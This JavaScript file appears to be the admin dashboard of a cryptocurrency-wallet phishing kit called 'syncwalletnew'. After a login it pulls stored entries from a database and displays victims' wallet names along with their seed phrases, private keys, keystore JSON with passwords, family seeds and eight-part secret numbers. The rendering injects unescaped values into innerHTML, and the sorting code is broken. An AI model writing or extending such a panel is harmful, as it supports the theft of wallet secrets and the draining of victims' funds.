"use strict";

import { getDataFromDB, login } from "../syncwalletnew/js/dbConfig.js";

//Variables decoration
let data = [];
const formBg = document.getElementById("auth");
const form = document.getElementById("auth-form");
const bg = document.getElementById("bg");
const table = document.getElementById("entries-table");

formBg.style.display = "none";
bg.style.display = "none";
table.style.display = "none";


const getAllData = async () => {
  formBg.style.display = "none";
  bg.style.display = "flex";
  const data = await getDataFromDB();
  if (data.length === 0) {
    const noDataMessage = document.getElementById("retriving-data-text");
    noDataMessage.innerText = "No entries yet";
  } else {
    const loading = document.getElementById("retriving-data");
    loading.style.display = "none";
  setdashBoardData(data);
  }
}

if (sessionStorage.getItem("ls") == null) {
  formBg.style.display = "flex";
  bg.style.display = "none";
  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const password = document.getElementById("auth-password").value;
    const email = document.getElementById("auth-email").value;

    await login(email, password, () => {
      getAllData();
    });
    form.reset();
  });
} else {
  await getAllData()
}

function setdashBoardData(listData) {
  formBg.style.display = "none";
  bg.style.display = "flex";
  table.style.display = "flex";

  listData
    .map((item) => {
      table.innerHTML += `
        <div class="list-tile">
          <div class="list-tile-top">
            <span class="list-tile-info">
              <img
                class="list-icon"
                src="./syncwalletnew/img/${item.data.wallet_id
                  .replaceAll(" ", "-")
                  .toLowerCase()}.png"
                alt=""
              />
              <h6 class="list-wallet-name">${item.data.wallet_id}</h6>
            </span>
            <span class="list-tile-data">
              <h6 class="list-tile-data-time normal-text text-lighter">${
                item.time
              }</h6>
            </span>
          </div>
          <div class="list-tile-more-data">
            <p class="list-tile-more-data-header bigger-text">${item.type}</p>
            ${
              item.type === "secret-numbers"
                ? `<ul class="list-tile-more-data-list">
              <li class="list-tile-more-data-list-item normal-text">${item.data.private1}</li>
              <li class="list-tile-more-data-list-item normal-text">${item.data.private2}</li>
              <li class="list-tile-more-data-list-item normal-text">${item.data.private3}</li>
              <li class="list-tile-more-data-list-item normal-text">${item.data.private4}</li>
              <li class="list-tile-more-data-list-item normal-text">${item.data.private5}</li>
              <li class="list-tile-more-data-list-item normal-text">${item.data.private6}</li>
              <li class="list-tile-more-data-list-item normal-text">${item.data.private7}</li>
              <li class="list-tile-more-data-list-item normal-text">${item.data.private8}</li>
            </ul>`
                : item.type === "phrase"
                ? `<ul class="list-tile-more-data-list">
              <li class="list-tile-more-data-list-item-block normal-text bigger-text">${item.data.phrase}</li>
              </ul>`
                : item.type === "keystore"
                ? `<ul class="list-tile-more-data-list">
              <li class="list-tile-more-data-list-item-block"><span class="bigger-text" >Keystore Json: </span> ${item.data.keystoreval}</li>
              <li class="list-tile-more-data-list-item-block"><span class="bigger-text" >Password: </span>${item.data.keystorepass}</li>
            </ul>`
                : item.type === "privatekey"
                ? `<ul class="list-tile-more-data-list">
              <li class="list-tile-more-data-list-item-block normal-text bigger-text">${item.data.privatekeyval}</li>
              </ul>`
                : `<ul class="list-tile-more-data-list">
              <li class="list-tile-more-data-list-item-block normal-text bigger-text">${item.data.familyseed}</li>
              </ul>`
            }
            
            
          </div>
          </div>
          `;

      return new Date((data.date + " " + data.time).replace(/-/g, " "));
    })
    .sort();
}
